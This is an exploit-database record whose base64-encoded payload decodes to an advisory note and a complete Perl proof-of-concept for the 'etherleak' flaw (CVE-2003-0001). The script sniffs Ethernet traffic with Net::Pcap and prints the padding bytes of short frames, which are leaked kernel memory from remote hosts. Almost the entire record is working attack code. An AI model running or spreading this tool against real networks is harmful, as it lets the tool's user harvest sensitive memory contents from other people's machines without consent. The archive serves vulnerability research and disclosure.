{
    "source": "exploit-database", 
    "exploit": "c291cmNlOiBodHRwOi8vd3d3LnNlY3VyaXR5Zm9jdXMuY29tL2JpZC82NTM1L2luZm8NCg0KTmV0d29yayBkZXZpY2UgZHJpdmVycyBmb3Igc2V2ZXJhbCB2ZW5kb3JzIGhhdmUgYmVlbiByZXBvcnRlZCB0byBkaXNjbG9zZSBwb3RlbnRpYWxseSBzZW5zaXRpdmUgaW5mb3JtYXRpb24gdG8gYXR0YWNrZXJzLg0KDQpGcmFtZXMgdGhhdCBhcmUgc21hbGxlciB0aGFuIHRoZSBtaW5pbXVtIGZyYW1lIHNpemUgc2hvdWxkIGhhdmUgdGhlIHVudXNlZCBwb3J0aW9uIG9mIHRoZSBmcmFtZSBidWZmZXIgcGFkZGVkIHdpdGggbnVsbCAob3Igb3RoZXIpIGJ5dGVzLiBTb21lIGRldmljZSBkcml2ZXJzIGZhaWwgdG8gZG8gdGhpcyBhZGVxdWF0ZWx5LCBsZWF2aW5nIHRoZSBkYXRhIHRoYXQgd2FzIHN0b3JlZCBpbiB0aGUgbWVtb3J5IGNvbXByaXNpbmcgdGhlIGJ1ZmZlciBwcmlvciB0byBpdHMgdXNlIGludGFjdC4gQ29uc2VxdWVudGx5LCB0aGlzIGRhdGEgbWF5IGJlIHRyYW5zbWl0dGVkIHdpdGhpbiBmcmFtZXMgYWNyb3NzIEV0aGVybmV0IHNlZ21lbnRzLiBTaW5jZSB0aGUgRXRoZXJuZXQgZnJhbWUgYnVmZmVyIGlzIGFsbG9jYXRlZCBpbiBrZXJuZWwgbWVtb3J5IHNwYWNlLCBzZW5zaXRpdmUgZGF0YSBtYXkgYmUgbGVha2VkLg0KDQpDaXNjbyBoYXMgc3RhdGVkIHRoYXQgdGhlIElPUyAxMi4xIGFuZCAxMi4yIHRyYWlucyBhcmUgbm90IGFmZmVjdGVkLg0KDQpOYXRpb25hbCBTZW1pY29uZHVjdG9yIEV0aGVybmV0IGNvbnRyb2xsZXIgY2hpcHMgYXJlIG5vdCB2dWxuZXJhYmxlIHRvIHRoaXMgaXNzdWUuIA0KDQojIS91c3IvYmluL3BlcmwgLXcNCiMgZXRoZXJsZWFrLCBjb2RlIHRoYXQgaGFzIGJlZW4gNSB5ZWFycyBjb21pbmcuDQojDQojIE9uIDA0LzI3LzIwMDIsIEkgZGlzY2xvc2VkIG9uIHRoZSBMaW51eCBLZXJuZWwgTWFpbGluZyBsaXN0LA0KIyBhIHZ1bG5lcmFiaWxpdHkgdGhhdCB3b3VsZCBiZSBjb21lIGtub3duIGFzIHRoZSAnZXRoZXJsZWFrJyBidWcuICBJbg0KIyB2YXJpb3VzIHNpdHVhdGlvbnMgYW4gZXRoZXJuZXQgZnJhbWUgbXVzdCBiZSBwYWRkZWQgdG8gcmVhY2ggYSBzcGVjaWZpYw0KIyBzaXplIG9yIGZhbGwgb24gYSBjZXJ0YWluIGJvdW5kYXJ5LiAgVGhpcyB0YXNrIGlzIGxlZnQgdXAgdG8gdGhlIGRyaXZlcg0KIyBmb3IgdGhlIGV0aGVybmV0IGRldmljZS4gIFRoZSBSRkNzIHN0YXRlIHRoYXQgdGhpcyBwYWRkaW5nIG11c3QgY29uc2lzdA0KIyBvZiBOVUxMcy4gIFRoZSBidWcgaXMgdGhhdCBhdCB0aGUgdGltZSBhbmQgc3RpbGwgdG8gdGhpcyBkYXksIG1hbnkgZGV2aWNlDQojIGRyaXZlcnMgZG8gbm90IHBhZCB3aWxsIE5VTExzLCBidXQgcmF0aGVyIHBhZCB3aXRoIHVuc2FuaXRpemVkIHBvcnRpb25zDQojIG9mIGtlcm5lbCBtZW1vcnksIG9mdGVudGltZXMgZXhwb3Npbmcgc2Vuc2l0aXZlIGluZm9ybWF0aW9uIHRvIHJlbW90ZQ0KIyBzeXN0ZW1zIG9yIHRob3NlIHNhdnZ5IGVub3VnaCB0byBjb2VyY2UgdGhlaXIgdGFyZ2V0cyB0byBkbyBzby4NCiMNCiMgUHJvb2Ygb2YgdGhpcyBjYW4gYmUgZm91bmQgYnkgZ29vZ2xpbmcgZm9yICd3YXJjaGlsZCBhbmQgZXRoZXJsZWFrJywgb3INCiMgYnkgdmlzaXRpbmc6DQojDQojICBodHRwOi8vbGttbC5vcmcvbGttbC8yMDAyLzQvMjcvMTAxDQojDQojIFRoaXMgd2FzIHVsdGltYXRlbHkgZml4ZWQgaW4gdGhlIExpbnV4IGtlcm5lbCwgYnV0IG92ZXIgdGltZSB0aGlzDQojIHZ1bG5lcmFiaWxpdHkgcmVhcmVkIGl0cyBoZWFkIG51bWVyb3VzIHRpbWVzLCBidXQgYXQgdGhlIGNvcmUgdGhlDQojIHZ1bG5lcmFiaWxpdHkgd2FzIHRoZSBzYW1lIGFzIHRoZSBvbmUgSSBvcmlnaW5hbGx5IHB1Ymxpc2hlZC4gIFRoZSBtb3N0DQojIHB1YmxpYyBvZiB0aGVzZSB3YXMgQ1ZFLTIwMDMtMDAwMSwgd2hpY2ggd2FzIGFzc2lnbmVkIHRvIGFkZHJlc3MgYW4NCiMgb2ZmaWNpYWwgQHN0YWtlIGFkdmlzb3J5Lg0KIw0KIyBUaGlzIGNvZGUgY2FuIGJlIGZvdW5kIGl0cyBtb3N0IGN1cnJlbnQgZm9ybSBhdDoNCiMgIA0KIyAgaHR0cDovL3Nwb29mZWQub3JnL2ZpbGVzL2V4cGxvaXRzL2V0aGVybGVhaw0KIw0KIyBKb24gSGFydCA8amhhcnRAc3Bvb2ZlZC5vcmc+LCBNYXJjaCAyMDA3DQojDQoNCnVzZSBzdHJpY3Q7DQp1c2UgZGlhZ25vc3RpY3M7DQp1c2Ugd2FybmluZ3M7DQp1c2UgR2V0b3B0OjpMb25nOw0KdXNlIE5ldDo6UGNhcDsNCnVzZSBOZXRQYWNrZXQ6OkV0aGVybmV0IHF3KDpBTEwpOw0KdXNlIE5ldFBhY2tldDo6SVAgcXcoOkFMTCk7DQoNCm15ICVvcHRzID0gKCk7DQpteSAoJGlmYWNlLCAkZXJyLCAkcGNhcF90LCAkcGNhcF9zYXZlLCAkZmlsdGVyX3N0cmluZyk7IA0KDQpHZXRPcHRpb25zKCBcJW9wdHMsICdoZWxwJywgJ2ZpbHRlcj1zJywgJ2ludGVyZmFjZT1zJywgJ3F1aWV0JywgJ3JlYWQ9cycsICd3cml0ZT1zJywgJ3ZlcmJvc2UnKSBvcg0KICAgICAgICAgICAgZGllICJVbmtub3duIG9wdGlvbjogJCFcbiIgJiYgJnVzYWdlKCk7DQoNCmlmIChkZWZpbmVkKCRvcHRzeydoZWxwJ30pKSB7DQogICAmdXNhZ2UoKTsNCiAgIGV4aXQoMCk7DQp9DQoNCmlmIChkZWZpbmVkKCRvcHRzeydyZWFkJ30pKSB7DQogICAkcGNhcF90ID0gTmV0OjpQY2FwOjpvcGVuX29mZmxpbmUoJG9wdHN7J3JlYWQnfSwgXCRlcnIpOw0KICAgaWYgKCFkZWZpbmVkKCRwY2FwX3QpKSB7DQogICAgICBwcmludCgiTmV0OjpQY2FwOjpvcGVuX29mZmxpbmUgZmFpbGVkOiAkZXJyXG4iKTsNCiAgICAgIGV4aXQgMTsNCiAgIH0NCn0gZWxzZSB7DQogICBpZiAoZGVmaW5lZCgkb3B0c3snaW50ZXJmYWNlJ30pKSB7DQogICAgICAkaWZhY2UgPSAkb3B0c3snaW50ZXJmYWNlJ307DQogICB9IGVsc2Ugew0KICAgICAgJGlmYWNlID0gTmV0OjpQY2FwOjpsb29rdXBkZXYoXCRlcnIpOw0KICAgICAgaWYgKGRlZmluZWQoJGVycikpIHsNCiAgICAgICAgIHByaW50KFNUREVSUiAibG9va3VwZGV2KCkgZmFpbGVkOiAkZXJyXG4iKTsNCiAgICAgICAgIGV4aXQoMSk7DQogICAgICB9IGVsc2Ugew0KICAgICAgICAgcHJpbnQoU1RERVJSICJObyBpbnRlcmZhY2Ugc3BlY2lmaWVkLiAgVXNpbmcgJGlmYWNlXG4iKTsNCiAgICAgIH0NCiAgIH0NCg0KICAgJHBjYXBfdCA9IE5ldDo6UGNhcDo6b3Blbl9saXZlKCRpZmFjZSwgNjU1MzUsIDEsIDAsIFwkZXJyKTsNCiAgIGlmICghZGVmaW5lZCgkcGNhcF90KSkgew0KICAgICAgcHJpbnQoIk5ldDo6UGNhcDo6b3Blbl9saXZlIGZhaWxlZCBvbiAkaWZhY2U6ICRlcnJcbiIpOw0KICAgICAgZXhpdCAxOw0KICAgfQ0KfQ0KDQpteSAkZmlsdGVyOw0KaWYgKE5ldDo6UGNhcDo6Y29tcGlsZSgkcGNhcF90LCBcJGZpbHRlciwgZGVmaW5lZCgkb3B0c3snZmlsdGVyJ30pID8gJG9wdHN7J2ZpbHRlcid9IDogIiIsIDAsIDApID09IC0xKSB7DQogICBwcmludGYoIk5ldDo6UGNhcDo6Y29tcGlsZSBmYWlsZWQ6ICVzXG4iLCBOZXQ6OlBjYXA6OmdldGVycigkcGNhcF90KSk7DQogICBleGl0KDEpOw0KfQ0KDQppZiAoTmV0OjpQY2FwOjpzZXRmaWx0ZXIoJHBjYXBfdCwgJGZpbHRlcikgPT0gLTEpIHsNCiAgIHByaW50ZigiTmV0OjpQY2FwOjpzZXRmaWx0ZXIgZmFpbGVkOiAlc1xuIiwgTmV0OjpQY2FwOjpnZXRlcnIoJHBjYXBfdCkpOw0KICAgZXhpdCgxKTsNCn0NCg0KaWYgKGRlZmluZWQoJG9wdHN7J3dyaXRlJ30pKSB7DQogICAkcGNhcF9zYXZlID0gTmV0OjpQY2FwOjpkdW1wX29wZW4oJHBjYXBfdCwgJG9wdHN7J3dyaXRlJ30pOw0KICAgaWYgKCFkZWZpbmVkKCRwY2FwX3NhdmUpKSB7DQogICAgICBwcmludGYoIk5ldDo6UGNhcDo6ZHVtcF9vcGVuIGZhaWxlZDogJXNcbiIsIE5ldDo6UGNhcDo6Z2V0ZXJyKCRwY2FwX3QpKTsNCiAgICAgIGV4aXQoMSk7DQogICB9DQp9DQoNCk5ldDo6UGNhcDo6bG9vcCgkcGNhcF90LCAtMSwgXCZwcm9jZXNzLCAiZm9vIik7DQpOZXQ6OlBjYXA6OmNsb3NlKCRwY2FwX3QpOw0KDQppZiAoZGVmaW5lZCgkb3B0c3snd3JpdGUnfSkpIHsNCiAgIE5ldDo6UGNhcDo6ZHVtcF9jbG9zZSgkcGNhcF9zYXZlKTsNCn0NCg0KDQoNCnN1YiBwcm9jZXNzIHsNCiAgIG15ICgkdXNlciwgJGhkciwgJHBrdCkgPSBAXzsNCiAgIG15ICgkbGluaywgJGlwKTsNCiAgIG15ICRqdW1wID0gMDsNCg0KICAgbXkgJGRhdGFsaW5rID0gTmV0OjpQY2FwOjpkYXRhbGluaygkcGNhcF90KTsNCiAgIGlmICAgICgkZGF0YWxpbmsgPT0gMSkgeyAkanVtcCArPSAxNDsgfQ0KICAgZWxzaWYgKCRkYXRhbGluayA9PSAxMTMpIHsgJGp1bXAgKz0gMTY7IH0NCiAgIGVsc2UgeyBwcmludGYoIlNraXBwaW5nIGRhdGFsaW5rICRkYXRhbGlua1xuIik7IHJldHVybjsgfQ0KDQogICBteSAkbDIgPSBOZXRQYWNrZXQ6OkV0aGVybmV0LT5kZWNvZGUoJHBrdCk7DQogICANCiAgIGlmICgkbDItPnt0eXBlfSA9PSBFVEhfVFlQRV9JUCkgew0KICAgICAgJGlwID0gTmV0UGFja2V0OjpJUC0+ZGVjb2RlKGV0aF9zdHJpcCgkcGt0KSk7DQogICAgICAkanVtcCArPSAkaXAtPntsZW59Ow0KICAgfSBlbHNpZiAoJGwyLT57dHlwZX0gPT0gRVRIX1RZUEVfQVJQKSB7ICRqdW1wICs9IDI4OyB9DQogICBlbHNlIHsgDQogICAgICAjIGFzc3VtZSA4MDIuMyBldGhlcm5ldCwgYW5kIGp1c3QganVtcCBhaGVhZCB0aGUgbGVuZ3RoDQogICAgICBmb3IgKCRsMi0+e2Rlc3RfbWFjfSkgew0KICAgICAgICAgaWYgKC9eMDE4MGMyMDAvKSB7DQogICAgICAgICAgICAjIHNwYW5uaW5nIHRyZWUNCiAgICAgICAgICAgICMgbDItPnt0eXBlfSBoZXJlIHdpbGwgYWN0dWFsbHkgYmUgdGhlIGxlbmd0aC4gIEhBQ0suDQogICAgICAgICAgICAkanVtcCArPSAkbDItPnt0eXBlfTsNCiAgICAgICAgIH0NCiAgICAgICAgIGVsc2lmICgvXjAxMDAwY2NjY2MvKSB7DQogICAgICAgICAgICAjIENEUC9WVFAvRFRQL1BBZ1AvVURMRC9QVlNULCBldGMNCiAgICAgICAgICAgICMgbDItPnt0eXBlfSBoZXJlIHdpbGwgYWN0dWFsbHkgYmUgdGhlIGxlbmd0aC4gIEhBQ0suDQogICAgICAgICAgICAkanVtcCArPSAkbDItPnt0eXBlfTsNCiAgICAgICAgIH0gZWxzaWYgKC9eYWIwMDAwMDIwMDAwLykgew0KICAgICAgICAgICAgIyBERUMtTU9QLVJlbW90ZS1Db25zb2xlDQogICAgICAgICAgICByZXR1cm47DQogICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgIyBsb29wYmFjaw0KICAgICAgICAgICAgaWYgKCRsMi0+e3NyY19tYWN9IGVxICRsMi0+e2Rlc3RfbWFjfSkgeyByZXR1cm47IH0NCiAgICAgICAgICAgIHByaW50ZigiU2tpcHBpbmcgZGF0YWxpbmsgJGRhdGFsaW5rIGwyIHR5cGUgJXNcbiIsICRsMi0+e3R5cGV9KTsgcmV0dXJuOw0KICAgICAgICAgfQ0KICAgICAgfQ0KICAgfQ0KDQoNCiAgIGlmICgkaGRyLT57bGVufSA+ICRqdW1wKSB7DQogICAgICBteSAkdHJhaWxlcl9iaW4gPSBzdWJzdHIoJHBrdCwgJGp1bXApOw0KICAgICAgbXkgJHRyYWlsZXJfaGV4ID0gIiI7DQogICAgICBteSAkdHJhaWxlcl9hc2NpaSA9ICIiOw0KICAgICAgZm9yZWFjaCAoc3BsaXQoLy8sICR0cmFpbGVyX2JpbikpIHsNCiAgICAgICAgICR0cmFpbGVyX2hleCAuPSBzcHJpbnRmKCIlMDJ4Iiwgb3JkKCRfKSk7DQogICAgICAgICBpZiAob3JkKCRfKSA+PSAzMiAmJiBvcmQoJF8pIDw9IDEyNikgew0KICAgICAgICAgICAgJHRyYWlsZXJfYXNjaWkgLj0gJF87DQogICAgICAgICB9IGVsc2UgeyAkdHJhaWxlcl9hc2NpaSAuPSAiLiI7IH0NCiAgICAgIH0NCiAgICAgICMgaWdub3JlIGFsbCB0cmFpbGVycyB0aGF0IGFyZSBqdXN0IHNpbmdsZSBjaGFyYWN0ZXJzIHJlcGVhdGVkLg0KICAgICAgIyBtb3N0IE9TJyB1c2UgMCwgRiwgNSBvciBhLg0KICAgICAgdW5sZXNzICgkdHJhaWxlcl9oZXggPX4gL14oMHw1fGZ8YSlcMSokL2kpIHsNCiAgICAgICAgIHVubGVzcyAoJG9wdHN7J3F1aWV0J30pIHsNCiAgICAgICAgICAgIHByaW50KCIjIng4MCwgIlxuIik7DQogICAgICAgICAgICBwcmludGYoIiVzIC0+ICVzXG4iLCAkbDItPntzcmNfbWFjfSwgJGwyLT57ZGVzdF9tYWN9KTsNCiAgICAgICAgICAgIGlmICgkbDItPnt0eXBlfSA9PSBFVEhfVFlQRV9JUCkgew0KICAgICAgICAgICAgICAgcHJpbnRmKCIlcyAtPiAlc1xuIiwgJGlwLT57c3JjX2lwfSwgJGlwLT57ZGVzdF9pcH0pOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgfQ0KICAgICAgICAgcHJpbnQoIiR0cmFpbGVyX2hleFx0JHRyYWlsZXJfYXNjaWlcbiIpOw0KICAgICAgICAgaWYgKGRlZmluZWQoJG9wdHN7J3dyaXRlJ30pKSB7DQogICAgICAgICAgICBOZXQ6OlBjYXA6OmR1bXAoJHBjYXBfc2F2ZSwgJGhkciwgJHBrdCk7DQogICAgICAgICB9DQogICAgICB9DQogICB9DQp9DQoNCnN1YiB1c2FnZSB7DQogICBwcmludCA8PEVPRjsNCiQwIC0tIEEgZGVtb25zdHJhdGlvbiBvZiB0aGUgaW5mYW1vdXMgJ2V0aGVybGVhaycgYnVnLg0KDQogICBDVkUtMjAwMy0wMDAxLCBhbmQgY291bnRsZXNzIHJlcGVhdHMgb2YgdGhlIHNhbWUgdnVsbmVyYWJpbGl0eS4NCg0KICAgT3B0aW9uczoNCiAgIFstaHwtLWhlbHBdICAgICAgICAgICAgICAgICAgIyB0aGlzIG1lc3NhZ2UNCiAgIFstaXwtLWludGVyZmFjZV0gPGludGVyZmFjZT4gIyBpbnRlcmZhY2UgdG8gbGlzdGVuIG9uDQogICBbLWZ8LS1maWx0ZXJdIDxwY2FwIGZpbHRlcj4gICMgYXBwbHkgdGhpcyBmaWx0ZXIgdG8gdGhlIHRyYWZmaWMNCiAgIFstcnwtLXJlYWRdIDxwYXRoIHRvIHBjYXA+ICAgIyByZWFkIGZyb20gdGhpcyBzYXZlZCBwY2FwIGZpbGUNCiAgIFstd3wtLXdyaXRlXSA8cGF0aCB0byBwY2FwPiAgIyB3cml0ZSB0b3RoaXMgc2F2ZWQgcGNhcCBmaWxlDQogICBbLXF8LS1xdWlldF0gICAgICAgICAgICAgICAgICMgYmUgcXVpZXQNCiAgIFstdnwtLXZlcmJvc2VdICAgICAgICAgICAgICAgIyBiZSB2ZXJib3NlDQoNCkVPRg0KDQoNCn0NCg0KIyBtaWx3MHJtLmNvbSBbMjAwNy0wMy0yM10=", 
    "filename": "platforms/bsd/remote/22131.pl", 
    "id": "22131", 
    "cves": [
        "CVE-2003-0001"
    ]
}